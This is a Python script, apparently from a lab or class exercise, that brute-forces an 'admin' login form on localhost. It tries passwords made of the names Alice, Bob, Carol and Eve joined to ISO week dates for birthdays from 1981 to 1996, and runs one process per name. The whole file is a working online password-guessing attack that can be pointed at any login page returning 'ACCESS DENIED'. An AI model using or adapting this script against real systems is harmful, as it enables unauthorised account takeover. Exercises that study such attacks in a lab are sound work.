# sources: https://curlconverter.com/
# https://en.wikipedia.org/wiki/ISO_8601
import requests
import datetime
from multiprocessing import Process, Event

def brute_force_single_name(headers, url, name, stop_event):
    data = {
        'username': 'admin',
        'password': '',
    }
   
    # pick reasonable first birthday possibility
    start_date = datetime.date(year=1981, month=1, day=1)
    end_date = datetime.date(year=1996, month=12, day=31)
    
   
    print(f'starting attempt for {name}')
    count = 0
    while start_date != end_date:
        if stop_event.is_set():
            print(f'{name} process is stopping as another process found the password.')
            break

        if count % (365) == 0:
            print(f'{count // 365} years passed: {start_date}')
        nameVersions = [name, name[0].upper()+name[1:], name.upper()]
        iso_year, iso_week, iso_weekday = start_date.isocalendar()

        iso_date = f"{iso_year}-W{iso_week:02d}-{iso_weekday}"

        for n in nameVersions:
            # nameYYYY-WWW-D
            data['password'] = n + str(iso_date)
            response = requests.post(url=url, headers=headers, data=data)
            if('<h2>ACCESS DENIED</h2>' not in response.text):
                print(f'SUCCESS: {data["password"]} is correct')
                stop_event.set()
                break
            
            # YYYY-WWW-Dname
            data['password'] =  str(iso_date) + n
            response = requests.post(url=url, headers=headers, data=data)
            if('<h2>ACCESS DENIED</h2>' not in response.text):
                print(f'SUCCESS: {data["password"]} is correct')
                break
                
        start_date += datetime.timedelta(days=1)
        count+=1

    return data['password']
            

if __name__ == "__main__":
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://localhost:8080',
        'Referer': 'http://localhost:8080/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
    }
    login_url = 'http://localhost:8080/login'

    names = ['Alice', 'Bob', 'Carol','Eve']
    for i in range(len(names)):
        names[i] = names[i].lower()
    
    stop_event = Event()

    processes = []
    # process = Process(target=brute_force_single_name)
    

    for person in names:
        process = Process(target=brute_force_single_name,args=(headers, login_url, person, stop_event))
        processes.append(process)
        process.start()
    
    for process in processes:
        process.join()

    print('Brute force completed.')
